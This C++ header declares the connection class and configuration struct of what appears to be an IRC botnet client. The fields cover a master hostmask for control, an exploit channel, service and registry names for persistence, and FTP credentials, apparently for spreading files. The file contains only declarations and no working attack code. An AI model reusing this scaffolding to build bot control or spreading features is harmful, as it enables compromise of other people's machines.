// CConnectIRC class
#include "vInclude.h"
#include "CThread.h"

#define ERRNO (WSAGetLastError())
#define EWOULDBLOCK WSAEWOULDBLOCK
#define EINPROGRESS WSAEWOULDBLOCK
#define SET_SOCK_BLOCK(s,block) { unsigned long __i=block?0:1; ioctlsocket(s,FIONBIO,&__i); }

struct cConfig {
	string vPrefix;
	string vNick;
	string vServer;
	string vIdent;
	unsigned int vPort;
	string vChan;
	string vExploitChan;
	string vChanPass;
	string vBotPass;
/*	string vMasterIdent;
	string vMasterHostmask;
	string vIdentHost;
	string vMasterNick;*/
	string vMasterPattern;
	string vSvcName;
	string vFileName;
	string vBotID;
	string vRegName;
	string vRealNick;
	string vFTP_IP;
	int vFTP_Port;
	string vFTP_User;
	string vFTP_Pass;
	string vFTP_File;

};


class CConnectIRC
{
public:
//	virtual void *Run(void);
	bool ConnectServer();
	bool StillConnected(void);	
	void Disconnect(char* szQuitMsg = "");
	unsigned long ResolveAddress(string server);
	bool ReceiveIRCBuffer(void);
	bool SendData(const char* vBuffer,...);
	vector <string> ParseIRCBuffer(string vBuffer, string type);
	void Init(void);
	bool IRCRunning;
	bool noReconnect;
	string RndNick(string vPrefix);

	cConfig cConf;

	//! Who to message
	string msgTo;
	
	bool bSilent;
	bool vReply;
	bool bInitiated;

	SOCKET vSocket;

};